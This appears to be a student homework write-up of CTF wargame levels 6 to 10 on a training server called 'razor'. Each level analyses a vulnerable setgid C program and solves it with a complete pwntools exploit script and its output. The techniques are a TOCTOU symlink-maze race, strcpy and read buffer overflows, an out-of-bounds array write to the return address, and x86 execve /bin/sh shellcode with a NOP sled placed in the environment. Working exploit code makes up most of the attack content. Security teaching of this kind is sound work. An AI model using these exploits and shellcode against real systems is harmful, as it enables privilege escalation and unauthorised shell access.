# Homework 3 - Razor CTF challenges

## Tools used

- **pwntools:** Pwntools is a CTF framework and exploit development library. Written in Python, it is designed for rapid prototyping and development, and intended to make exploit writing as simple as possible.

## Level 6

Inspecting the contents of `/var/challenge/level5`:

```bash
icyfire@razor → ls /var/challenge/level5 -lha
total 28K
drwxr-x---  2 root lev5 4.0K Oct 11 17:38 .
drwxr-xr-x 16 root sudo 4.0K Aug 27  2020 ..
-rwxr-sr-x  1 root lev6 9.4K Aug 27  2020 5
-rw-r--r--  1 root lev5 1.1K Aug 27  2020 5.c
-rw-r--r--  1 root lev6   28 Aug 27  2020 5.cmd
```

Examining `5.c` we have

```c
if (stat(argv[1], &buf)) {
    fprintf(stderr, "Can't stat the file\n");
    exit(1);
}
...
if ((f = fopen(argv[1], "r")) == NULL) {
    fprintf(stderr, "Cannot open command file\n");
    return 1;
}
...
while (fgets(cmd, BUFSIZE, f)) {
    int i;

    for (i=0; cmd[i] != 0; i++) {
        if (!isprint(cmd[i]) && !isspace(cmd[i])) {
        fprintf(stderr, "Bad characters found.\n");
        return 1;
        }
    }

    if (system(cmd)) {
        fprintf(stderr, "Command execution error.\n");
        return 1;
    }
}
...
```

We can see that, the program accepts a filename as argument. Then it checks if the file exists and then opens it for reading if its owned by the group `lev5`. We can see that there is a file called `5.cmd` which is owned by group `lev5` in the same directory. Once the file is opened, it executes the commands given in the file one by one.

Since there is a gap between checking if the file exists and opening the file for reading, we can take advantage of time-of-check to time-of-use (TOCTOU) bug to exploit the program. We can use a symlink maze to create a race condition to exploit the program.

The basic building block of a maze is a chain, defined to be (nearly) the deepest nested directory tree one can define without violating the PATH_MAX constraint imposed by the kernel on the length of file paths (4KB is a typical value). Thus, `chain0` would be `chain0/d/d/d/.../d` such that the associated number of characters is a bit less than PATH_MAX. Likewise, `chain1` is `chain1/d/d/d/.../d`, etc.

To form a maze, the we connect chains by placing a symbolic link at the bottom of chain `i+1` that points to chain `i`. The final symlink, at the bottom of `chain n`, points to an exit symlink which, in turn, points to the actual target file. Finally, the entry point to the maze, `evil`, is a symlink pointing to the first chain.

While the program is resolving the symlink, we swap out the first symlink to our target file containing commands to start a shell. This can be achieved using the following python script.

```python
import os
import time
from pwn import process

TARGET_COMMAND = "/var/challenge/level5/5.cmd"
TARGET_EXECUTABLE = "/var/challenge/level5/5"
LINK_NAME = "symlink"
EVIL_LINK_NAME = 'evil'
MAZE_PATH = os.getcwd() + "/maze/"

DICT = "abcdefghijklmnopqrstuvwxyz"
MAZE_DEPTH = 2000

# Creation of the maze
print("Creating symlink maze")
# Two loops are used here because python has a max recursion limit of 1000
steps = set(range(900, MAZE_DEPTH, 900))
steps.add(MAZE_DEPTH)
for i in sorted(steps):
    for char in DICT:
        subdir = (char + "/") * i
        os.makedirs(MAZE_PATH + subdir, exist_ok=True)

# Linking the last symlink to the target 5.cmd file in /var/challenge/level5
subdir = (DICT[-1] + "/") * MAZE_DEPTH
os.symlink(TARGET_COMMAND, MAZE_PATH + subdir + LINK_NAME)
last_dir = subdir

# Linking each subdirectory to the next one
for char in reversed(DICT[:-1]):
    subdir = (char + "/") * MAZE_DEPTH
    os.symlink(MAZE_PATH + last_dir + LINK_NAME, MAZE_PATH + subdir + LINK_NAME)
    last_dir = subdir

# Creating the target link to be used as parameter for the program and linking it to the first link in the chain
os.symlink(MAZE_PATH + ("a" + "/") * MAZE_DEPTH + LINK_NAME, MAZE_PATH + LINK_NAME)

# Creating a file with the command to start a shell
print("/bin/sh", file=open(MAZE_PATH + EVIL_LINK_NAME, 'a'))

print("Starting exploit")
# Start the program with the entry link to the maze as first parameter
proc = process(argv=[TARGET_EXECUTABLE, MAZE_PATH + LINK_NAME], env=os.environ)

#Introduce a small delay
time.sleep(0.01)

# Change the first link to our desired target file
os.remove(MAZE_PATH + LINK_NAME)
os.symlink(MAZE_PATH + EVIL_LINK_NAME, MAZE_PATH + LINK_NAME)

# Start an interactive shell to type our commands
proc.interactive()

# Delete the maze
os.system('rm -rf ' + MAZE_PATH)
```

We can execute the script to get a shell and obtain access to the next level

```bash
icyfire@razor level5 → python3 exploit.py
Creating symlink maze
Starting exploit
[+] Starting local process '/var/challenge/level5/5': pid 542229
[*] Switching to interactive mode
$ l33t
Woot! Congratulations you broke level lev6!
Adding user 'icyfire' to group 'lev6' ...
Adding user icyfire to group lev6
Done
$
[*] Stopped process '/var/challenge/level5/5' (pid 542229)
```

# Level 7

Inspecting the contents of `/var/challenge/level6`:

```bash
icyfire@razor level6 → ls /var/challenge/level6 -lha
total 128K
drwxr-x---  2 root lev6 4.0K Nov  4  2021 .
drwxr-xr-x 16 root sudo 4.0K Aug 27  2020 ..
-rwxr-sr-x  1 root lev7 7.6K Aug 27  2020 6
-rw-r--r--  1 root lev6  759 Aug 27  2020 6.c
-rwxr-xr-x  1 root lev7  70K Aug 27  2020 sort
-rwxr-xr-x  1 root lev7  34K Aug 27  2020 uniq
```

Examining `6.c` we have 

```c
...
if (argv[1]) {
    snprintf(filename, 255, "/var/challenge/level6/%s", basename(argv[1]));
    printf("Checking filename %s\n", filename);
    if (access(filename, X_OK)) {
        fprintf(stderr, "You do not have the permission to execute this file\n");
        return 1;
    }
}
...
if (argv[2]) {
    strcpy(buffer, argv[2]);
}
else {
    gets(buffer);
}
printf("Executing filename %s\n", filename);
execlp(filename, filename, buffer, (char *)0);
...
```

The program accepts two arguments. The first is a filename and second is a command. It checks if the filename given in the first argument is present in the directory `/var/challenge/level6` and if the file is executable. It then copies the second argument to a buffer and then execute the filename with the buffer as arguments. We can exploit the `strcpy` function to create a buffer overflow. We can use `sort` or `uniq` as the first parameter of the program since those two executables are available in the challenge directory. We can use input fuzzing to figure out an input which breaks the program.

```bash
icyfire@razor level6 → /var/challenge/level6/6 sort $(python -c "print 'A' * 260")
Checking filename /var/challenge/level6/sort
Executing filename AAAA
```

Here we can see that the `strcpy` function overflowed the buffer and somehow overwrote the filename to be executed. After a few trials we can find the exact point where the filename gets overwritten.

```bash
icyfire@razor level6 → /var/challenge/level6/6 sort $(python -c "print 'A' * 256 + 'ABCD'")
Checking filename /var/challenge/level6/sort
Executing filename ABCD
```

We can replace `ABCD` in the input to any command that we want to run. This can be achieved with the help of the following python script.

```python
import os
from pwn import process
arg = "A" * 256 + "l33t"
proc = process(argv=['/var/challenge/level6/6', 'sort', arg], env=os.environ)
print(proc.recvall().decode())
```

Running the exploit we get:

```bash
icyfire@razor level6 → python3 exploit.py
[+] Starting local process '/var/challenge/level6/6': pid 759401
[+] Receiving all data: Done (163B)
[*] Process '/var/challenge/level6/6' stopped with exit code 0 (pid 759401)
Checking filename /var/challenge/level6/sort
Executing filename l33t
Woot! Congratulations you broke level lev7!
Adding user 'icyfire' to group 'lev7' ...
Adding user icyfire to group lev7
Done
```

## Level 8

Inspecting the contents of `/var/challenge/level7`:

```bash
icyfire@razor level7 → ls /var/challenge/level7 -lha
total 20K
drwxr-x---  2 root lev7 4.0K Nov  4  2021 .
drwxr-xr-x 16 root sudo 4.0K Aug 27  2020 ..
-rwxr-sr-x  1 root lev8 7.5K Aug 27  2020 7
-rw-r--r--  1 root lev7  758 Aug 27  2020 7.c
```

Examining the program `7.c`:

```c
...
int table[] = {2, 3, 5, 7, 11, 13, 17};
...
loadTable(array);
index = (int) strtol(argv[1], NULL, 10);
value = (int) strtoul(argv[2], NULL, 16);
...
array[index] = value;
```

Here we can see that the program accepts two arguments, the first argument is an index and the second argument is a value. The first argument is converted to a  integer and the second argument is converted to an unsigned  integer. The value in the array with index given as the first parameter is changed to the value given as the second parameter. Here we can use integer overflow to write beyond the array and overwrite the return address. We can use the environment of the program to store shell code which starts `/bin/sh` and then overwrite the return address to point to the same.

Using fuzzing we can find an input which creates a segmentation fault in the program:

```bash
icyfire@razor level7 → /var/challenge/level7/7 11 0
Updating table value at index 11 with 0: previous value was -136388891
The updated table is:
0: 2
1: 3
2: 5
3: 7
4: 11
5: 13
6: 17
Segmentation fault
```

Now we can use `gdb` to craft an exploit. Firstly export the shell code to the environment with a NOP sled:

```bash
icyfire@razor level7 → export _SHELLCODE=$(python -c 'print "\x90"*100000 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"')
```

Start GDB to inspect the program and setting a breakpoint at the `return` of `main`.

```bash
icyfire@razor level7 → gdb /var/challenge/level7/7
Reading symbols from /var/challenge/level7/7...
(No debugging symbols found in /var/challenge/level7/7)
(gdb) disas main
Dump of assembler code for function main:
...
   0x08048629 <+246>:	jle    0x8048603 <main+208>
   0x0804862b <+248>:	mov    $0x0,%eax
   0x08048630 <+253>:	leave
   0x08048631 <+254>:	ret
End of assembler dump.
(gdb) break *0x08048631
Breakpoint 1 at 0x8048631
```

Run the program with `11` as first argument and examine the top of the stack. Since the breakpoint is at `ret` instruction, the top of the stack consists of the return address.

```bash
(gdb) run 11 0
Starting program: /var/challenge/level7/7 11 0
Updating table value at index 11 with 0: previous value was -136388891
The updated table is:
0: 2
1: 3
2: 5
3: 7
4: 11
5: 13
6: 17

Breakpoint 1, 0x08048631 in main ()
(gdb) stack
Undefined command: "stack".  Try "help".
(gdb) x/4wx $esp
0xfffe4c4c:	0x00000000	0x00000003	0xfffe4ce4	0xfffe4cf4
```

We can see that the return address got overwritten with the value that we supplied in the arguments. Next we can examine the evironment of the program to find the address of the shell code that we inserted.

```bash
(gdb) x/64s *((char **) environ)
...
0xfffe57ef:	"_SHELLCODE=", '\220' <repeats 189 times>...
0xfffe58b7:	'\220' <repeats 200 times>...
0xfffe597f:	'\220' <repeats 200 times>...
...
```

We can choose an address in the middle of the NOP sled to overwrite the return address with. With the above information the program can be exploited with the following python script.

```python
import os
from pwn import process
shell_code = "\x90" * 100000 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
env = os.environ
env['_SHELLCODE'] = shell_code
proc = process(argv=['/var/challenge/level7/7', '11', '0xfffe658b'], env=env)
proc.interactive()
```

Running the exploit:

```bash
icyfire@razor level7 → python3 exploit.py
[+] Starting local process '/var/challenge/level7/7': pid 4125077
[*] Switching to interactive mode
Updating table value at index 11 with -105077: previous value was -136388891
The updated table is:
0: 2
1: 3
2: 5
3: 7
4: 11
5: 13
6: 17
$ l33t
Woot! Congratulations you broke level lev8!
Adding user 'icyfire' to group 'lev8' ...
Adding user icyfire to group lev8
Done
$
[*] Stopped process '/var/challenge/level7/7' (pid 4125077)
```

## Level 9

Inspecting the contents of `/var/challenge/level8`:

```bash
icyfire@razor level8 → ls -lha /var/challenge/level8
total 32K
drwxr-x---  2 root lev8 4.0K Nov  7  2021 .
drwxr-xr-x 16 root sudo 4.0K Aug 27  2020 ..
-rwxr-sr-x  1 root lev9  15K Aug 27  2020 8
-rw-r--r--  1 root lev8 5.4K Aug 27  2020 8.c
```

Examining `8.c` we can see that it is a socket server program. The program starts TCP or UDP server on a specified port based on the command line arguments. Examining the TCP server part of the program we can see that it creates a new child process for every incoming connection and the child process runs the `manage_tcp_client` function. In the child `stdout` and `stdin` is redirected to output and input of the socket. Examining the `manage_tcp_client` function, we can see:

```c
while ((ret = read(0, &buffer[index], 1)) > 0) {
    index++;
    buffer[index] = '\0';
    fflush(stdout);
    if (buffer[index - 1] == 0x0a) {
        buffer[index - 1] = '\0';
        break;
    }
}
```

The server is reading the input one character at a time until it encounters a '\n' character. We can exploit the `read` function to create a buffer overflow to overwrite the return address of `manage_tcp_client` function.

We can start by exporting shell code to the environment, starting `GDB` and setting it up to follow the child process. We can disassesemble the `manage_tcp_client` function and set a break point on the while loop reading from the socket and then at the return address.

```bash
icyfire@razor level8 → gdb /var/challenge/level8/8
Reading symbols from /var/challenge/level8/8...
(gdb) set follow-fork-mode child
(gdb) disas manage_tcp_client
...
   0x08048aef <+157>:	cmpl   $0x0,-0x4(%ebp)
   0x08048af3 <+161>:	jg     0x8048a8b <manage_tcp_client+57>
   0x08048af5 <+163>:	cmpl   $0x0,-0x4(%ebp)  
...
   0x08048b6f <+285>:	leave
   0x08048b70 <+286>:	ret
...
(gdb) break *0x08048af3
Breakpoint 1 at 0x8048af3
(gdb) break *0x08048b70
Breakpoint 2 at 0x8048b70
(gdb) run -p 42068
Starting program: /var/challenge/level8/8 -p 42068
Starting server on port 42068
```

We can use `netcat` to send input to the program

```bash
icyfire@razor ~ → python -c "print(b'A' * 65536 + b'\n')" | nc localhost 42068
```

Continuing the loop till the last character and then examining the end of the buffer:

```bash
[Attaching after process 3825889 fork to child process 3996620]
[New inferior 2 (process 3996620)]
[Detaching after fork from parent process 3825889]
[Inferior 1 (process 3825889) detached]
[Switching to process 3996620]

Thread 2.1 "8" hit Breakpoint 1, 0x08048af3 in manage_tcp_client ()
(gdb) continue 65535
Will ignore next 65533 crossings of breakpoint 1.  Continuing.

Thread 2.1 "8" hit Breakpoint 1, 0x08048af3 in manage_tcp_client ()
(gdb) x/16wx $esp + 65536
0xfffed2a0:	0x41414141	0x41414141	0x41414141	0x41414141
0xfffed2b0:	0x0000ffff	0x00000001	0xffffd328	0x08049267
0xfffed2c0:	0x00000004	0xffffd2f4	0xffffd2e0	0xffffd2dc
0xfffed2d0:	0x00000004	0x00000000	0x00000000	0x00000000
```

Here we can see that the buffer has been filled till the end. In the stack we can see the `index` variable with the value `0x0000ffff` after the buffer. In order to continue writing we need to write a single byte to the index value so that the write continues at an address that we want, the return address. Continuing to the next breakpoint we can find the address of the return address.

```bash
Thread 2.1 "8" hit Breakpoint 2, 0x08048b70 in manage_tcp_client ()
(gdb) x/4wx $esp
0xfffed2bc:	0x08049200	0x00000004	0xffffd2f4	0xffffd2e0
```

From the above two stack dumps we can see that the stack is 12 bytes away from the index variable. We can write a custom value to the return address by writing a byte which makes the index value `0x0001000b`.

Using the following input:

```bash
icyfire@razor ~ → python -c "print(b'A' * 65536 + b'\x0b' + b'BBBB' +  b'\n')" | nc localhost 42068
```

Examining the stack:

```bash
Thread 4.1 "8" hit Breakpoint 2, 0x08048b70 in manage_tcp_client ()
(gdb) x/4wx $esp
0xfffed2bc:	0x42424242	0x00000000	0xffffd2f4	0xffffd2e0
```

We can see that the return address is overwritten with `BBBB` that we supplied in the input. Finding the address of the shellcode from the environment like the previous level, we can provide it in the input to run out shellcode. We can come up with the following exploit script.

```python
import os
from pwn import p32, process, remote

padding_length = 65536
target = 0xfffe6fef

env = os.environ
env["_SHELLCODE"] = "\x90" * 100000 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
msg = ('A' * padding_length).encode() + b'\x0b'  + p32(target) + '\n'.encode()

proc = process(argv=['/var/challenge/level8/8', '-p', '42068'], env=env)
connection = remote('127.0.0.1', 42068)
print(connection.readuntil(b'Ready to read!\n'))
connection.send(msg)
connection.readuntil(b'Done!\n')
connection.interactive()
connection.recvall(timeout=2)
```

Running the exploit script we get:

```bash
icyfire@razor level8 → python3 exploit.py
[+] Starting local process '/var/challenge/level8/8': pid 1897233
[+] Opening connection to 127.0.0.1 on port 42068: Done
b'Ready to read!\n'
[*] Switching to interactive mode
$ l33t
Woot! Congratulations you broke level lev9!
Adding user 'icyfire' to group 'lev9' ...
Adding user icyfire to group lev9
Done
$
[+] Receiving all data: Done (0B)
[*] Closed connection to 127.0.0.1 port 42068
[*] Stopped process '/var/challenge/level8/8' (pid 1897233)
```

## Level 10

Inspecting the contents of `/var/challenge/level9`:

```bash
icyfire@razor level9 → ls -lha /var/challenge/level9
total 28K
drwxr-x---  2 root lev9  4.0K Nov  6 19:47 .
drwxr-xr-x 16 root sudo  4.0K Aug 27  2020 ..
-rwxr-sr-x  1 root lev10  16K Oct 24 01:02 9
-rw-r--r--  1 root lev9   366 Oct 24 01:02 9.c
```

Examining the program `9.c`:

```c
if ((getegid() != getgid()) && argc > 1) {
    exit(1);
}

if (strchr(argv[4], 0x90)) exit(2);
if (strchr(argv[4], 0x31)) exit(2);

strcpy(buf, argv[4]);
```

Here we can see that program exits if an effective guid is set and if any argument is supplied to it. It then proceeds to copy `argv[4]` to a buffer if there are no special characters in it. Since no arguments are provided, it'll overflow and copy a value from the environment into the buffer. `argv[0]` consists of the path of the program, `argv[1]` will overflow into the environment and thus `argv[4]` will correspond to the second value in the environment. We can use the `env -i` command to run the program with blank environment.

Next we can enable core dumps and start the program.

```bash
icyfire@razor level9 → ulimit -c unlimited

icyfire@razor level9 → env -i env1=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA env2=BBBBBBBBBBBBBBBBBBBBBBBB env3=CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC ./9
Segmentation fault (core dumped)
05:02:40 icyfire@razor level9 → gdb -c core
[New LWP 1466415]
Core was generated by `./9'.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0x43434343 in ?? ()
(gdb) x/1i $eip
=> 0x43434343:	Cannot access memory at address 0x43434343
```

We can see that the instruction pointer got overwritten with the value from the third environment value that we supplied. Changing the second environment variable with a unique input we get:

```bash
icyfire@razor level9 → env -i env1=AAA env2=BBBB env3=ABCDABCDABCDABCDABCDABCDABCDABCDABCD ./9
Segmentation fault (core dumped)

icyfire@razor level9 → gdb -c core
[New LWP 3599060]
Core was generated by `./9'.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0x43424144 in ?? ()
(gdb) x/1i $eip
=> 0x43424144:	Cannot access memory at address 0x43424144
```

Here we can see that the instruction pointer got overwritten by the value `0x43424144` which corresponds to 'DABC'. The return address is offset by 1 character and the intitial part of the environment variable which is `env3=`. So we need to offset the return address by 6 characters or 6 % 4 = 2 characters. Using methods mentioned in the previous levels we can get the address of the shellcode put in the environment using `gdb`. Once we have the address (`0xfffe5ceb`) we can construct the exploit script the following way:

```python
import os
from pwn import process
shell_code = "\x90" * 100000 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
env = os.environ
env['_SHELLCODE'] = shell_code
env[list(env.keys())[2]] = "\x41\x41\xeb\x5c\xfe\xff\xeb\x5c\xfe\xff\xeb\x5c\xfe\xff\xeb\x5c\xfe\xff\xeb\x5c\xfe\xff"
proc = process(executable='./9', argv=[], env=env)
proc.interactive()
```

Running the exploit script:

```bash
icyfire@razor level9 → python3 exploit.py
[+] Starting local process '/var/challenge/level9/9': pid 377772
[*] Switching to interactive mode
$ l33t
Woot! Congratulations you broke level lev10!
Adding user 'icyfire' to group 'lev10' ...
Adding user icyfire to group lev10
Done
$
[*] Stopped process '/var/challenge/level9/9' (pid 377772)
```
